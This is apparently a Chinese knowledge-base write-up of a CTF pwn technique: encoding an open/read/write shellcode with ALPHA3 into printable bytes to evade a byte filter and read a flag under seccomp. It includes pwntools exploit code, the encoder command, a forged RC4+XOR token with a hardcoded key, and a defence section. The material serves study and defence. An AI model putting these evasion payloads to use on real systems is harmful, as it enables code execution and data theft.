---
id: binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw
title: ALPHA3 可见字符 Shellcode：绕过 <=0x1f/0x7f 字节过滤执行 seccomp ORW
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: alpha3-visible-shellcode-seccomp-orw
tags:
- pwn
- shellcode
- alphanumeric
- alpha3
- seccomp
- orw
- byte-filter
- sandbox-escape
- linux
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V92
  verified_at: '2026-11-05T19:43:55+08:00'
  notes: 已对照原文核对：mmap RWX、逐字节拒绝<=0x1F/0x7F、sub_1908检查后sub_17CC装seccomp、protobuf-c消息字段与RC4+XOR token、ALPHA3 alpha3_encode.sh raw.bin alpha.txt rax、最终可见字符payload均与原文一致；原文无图。PoC未在本机复跑；无组件影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw/
draft: false
kb_aliases:
- ALPHA3
- alpha3_encode.sh
- 可见字符 shellcode
- 字母数字 shellcode
- 字节过滤绕过
- seccomp ORW
- ez_orw
---

## 一句话结论

当程序在把输入拷进 RWX 页执行前逐字节拒绝 `<= 0x1F` 和 `0x7F` 的字符，并安装只放行 `open/read/write` 一类系统调用的 seccomp 时，可以先构造 `open("flag") + read + write` 的 ORW shellcode，再用 ALPHA3 以某个基址寄存器（如 `rax`）把它编码成全部由可见字符组成的 alphanumeric shellcode；解码器在目标内存中还原原始指令，从而绕过字节过滤并读出 flag。

## 原理

- **过滤是逐字节的静态检查**：程序在 seccomp 安装前扫描输入缓冲区，只要任一字节省略值 `<= 0x1F` 或等于 `0x7F` 就退出。它不理解 x86 指令语义，也不反汇编，因此只要最终交付的字节全部落在可打印范围，检查就会通过；真正的 `syscall`、寄存器操作等“非法字节”由编码器在运行时还原。
- **ALPHA3 的编码模型**：ALPHA3 是 x86-64 alphanumeric shellcode 编码器（配套 `alpha3_encode.sh`），输入原始 shellcode 与一个基址寄存器名，输出一段完全由字母数字/可打印 ASCII 组成的 decoder + 编码数据。运行时 decoder 先根据指定寄存器定位编码数据，逐段解码并跳入原始 shellcode。选择 `rax` 是因为程序跳到 shellcode 起点时该寄存器常指向/可用于定位缓冲区；具体基址寄存器要按目标寄存器状态选择，ALPHA3 支持多种寄存器。
- **为什么需要 ORW**：seccomp 白名单通常只放行 `open`/`openat`、`read`、`write`、`exit` 等，`execve` 被禁止，不能直接弹 shell；因此 shellcode 必须自己打开文件、读取内容并写到 stdout。原文使用 pwntools `shellcraft.open('flag', 0)`、`shellcraft.read('rax', 'rsp', 0x100)`、`shellcraft.write(1, 'rsp', 0x100)` 构造 ORW。
- **长度约束**：程序还要求 shellcode 长度小于泄漏出的 `dword_5008`，且整次 `read` 不超过 `0x100`；ALPHA3 编码后的长度会膨胀，原文最终 payload 约 170 字节，仍落在 255 字节限制内。若原始 shellcode 较大，需要精简（减少寄存器设置、使用 `openat`、缩短路径）或调整编码参数。
- **与其他字节过滤绕过的区别**：自修改 shellcode 针对“禁止 `0f 05` 字节序列”的扫描（运行时把 `0e 05` 改成 `0f 05`）；ALPHA3 针对“只允许可见字符”的白名单，编码整个 payload，不依赖自修改权限，但依赖可打印字符解码器。
- **边界**：需要可执行输入缓冲区（RWX 或等价 JIT 页）；需要知道/控制解码器基址寄存器；编码后长度受限；seccomp 若禁止 `open/openat` 或要求特定参数，需要换用允许的调用（如 `openat`、`sendfile`）；若过滤器做反汇编/规范化检查而非字节检查，编码器可能失效。

## 触发条件

- 程序把用户输入复制到可执行内存并跳转执行（CTF 常见 RWX shellcode 题），且在执行前做逐字节字符白名单/黑名单检查（拒绝 `<=0x1f`、`0x7f` 等）。
- seccomp 过滤器禁止 `execve`，但放行读取 flag 所需的 `open/openat/read/write`；目标 flag 文件对进程可读。
- 输入长度有上限（如 `<=0x100`），需要控制编码后 shellcode 大小；目标架构为 x86-64。
- 能确定 ALPHA3 解码器可用的基址寄存器（如 `rax` 指向缓冲区），且程序跳转时寄存器状态符合编码器假设。

## 利用步骤

1. **确认过滤与执行环境**：`checksec`、反汇编确认 mmap 权限为 RWX、输入长度、逐字节检查逻辑与 seccomp 安装顺序；用 `seccomp-tools dump ./chal` 查看允许的系统调用。
2. **构造 ORW shellcode**（pwntools）：
   ```python
   sc  = asm(shellcraft.open('flag', 0))
   sc += asm(shellcraft.read('rax', 'rsp', 0x100))
   sc += asm(shellcraft.write(1, 'rsp', 0x100))
   open('raw.bin','wb').write(sc)
   ```
3. **ALPHA3 编码**：`bash ./alpha3_encode.sh raw.bin alpha.txt rax`（按目标寄存器状态选择基址寄存器；输出到 `alpha.txt`）。
4. **校验字符与长度**：确认 `all(b > 0x1f and b != 0x7f for b in data)`，且长度小于程序限制（原文约 170 字节 < 0x100）。
5. **包装协议**：按目标程序的输入格式（原文是 protobuf-c 消息，含 `giaoid=0x114514`、`giaosize=0x415411`、`giaocontent`、`giaotoken`）把编码 shellcode 放入 content 字段；token 需按程序的 RC4+XOR 校验伪造（见原理/变体）。
6. **发送并读取输出**：程序检查通过后安装 seccomp、把 content 复制到 RWX 页执行；ORW 打开 flag 并 write 到 stdout。
7. **失败排查**：若进程被杀，用 `seccomp-tools`/`strace` 确认是哪个 syscall 被拒绝；若解码失败，检查基址寄存器、对齐与编码器参数。

## PoC

原文最终 exp 的核心片段（未在本机复跑）：

```python
from pwn import *
context.arch = "amd64"

# 1) 原始 ORW shellcode
sc  = asm(shellcraft.open('flag', 0))
sc += asm(shellcraft.read('rax', 'rsp', 0x100))
sc += asm(shellcraft.write(1, 'rsp', 0x100))
open('raw.bin', 'wb').write(sc)

# 2) ALPHA3 编码（命令行）
# bash ./alpha3_encode.sh raw.bin alpha.txt rax
payload = open('alpha.txt', 'rb').read()
assert all(b > 0x1f and b != 0x7f for b in payload)
assert len(payload) < 0x100

# 3) 原文通过 protobuf-c 消息发送：
#    giaoid=0x114514, giaosize=0x415411,
#    giaocontent=payload, giaotoken=RC4+XOR 伪造的 36 字节 token
```

```python
# token 伪造：程序目标密文为固定 36 字节，密钥 "114514giaogiaogiao99"
cipher = rc4_crypt(rc4_init_state("114514giaogiaogiao99"), target_bytes)
token  = xor(cipher, b"114514giaogiaogiao99".ljust(len(cipher), b"\x00"))
```

## 变体与关联

- **编码器变体**：RAVEN、`ae64`、msfvenom alphanumeric encoder、自定义可见字符解码器；不同基址寄存器（rax/rcx/rdx/rsi/rdi）；多段解码/自修改解码。
- **过滤变体**：拒绝 `0f 05` 等 syscall 字节（用自修改 shellcode，见 [[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]）；只允许 Base64/十六进制字符；长度限制更紧时用 `openat`/`sendfile` 精简。
- **seccomp 变体**：只允许 `openat` 不允许 `open`；只允许 `write` 到已打开 fd（见 [[binary-pwn-sandbox-escape-seccomp-write-fd-fcntl-dup2]]）；用 `dup2`/`fcntl` 把 flag fd 复制到 stdout。
- **关联**：[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]、[[binary-pwn-sandbox-escape-seccomp-write-fd-fcntl-dup2]]、[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]；本题的 protobuf-c 描述符恢复见 [[code-analysis-reverse-linux-protobuf-c-descriptor-recovery]]。
- **边界**：RWX 页被禁用、过滤器做指令级校验、seccomp 不允许文件读取、输入长度不足以容纳编码器时失效；ALPHA3 输出仍可能因寄存器状态不匹配而解码失败。

## 检测与防御

- **对 CTF/分析者**：逐字节过滤不等于指令级安全；应假设被测输入可被编码/自修改绕过。可用 `seccomp-tools` 确认白名单，用 `strace` 验证 ORW。
- **对防御方**：禁止 RWX 页，改用 W^X；对 shellcode 做反汇编/模拟执行校验而不是字节白名单；seccomp 使用最小白名单并限制参数（如只允许打开特定路径）；隐藏/降权 flag 文件；启用 CET/CFG 等控制流保护。
- **监控**：进程出现可执行私有内存、非常规 `open/read/write` 序列、大量可打印字符作为代码、`syscall` 前寄存器设置异常；CTF 环境外可结合 EDR 内存扫描。
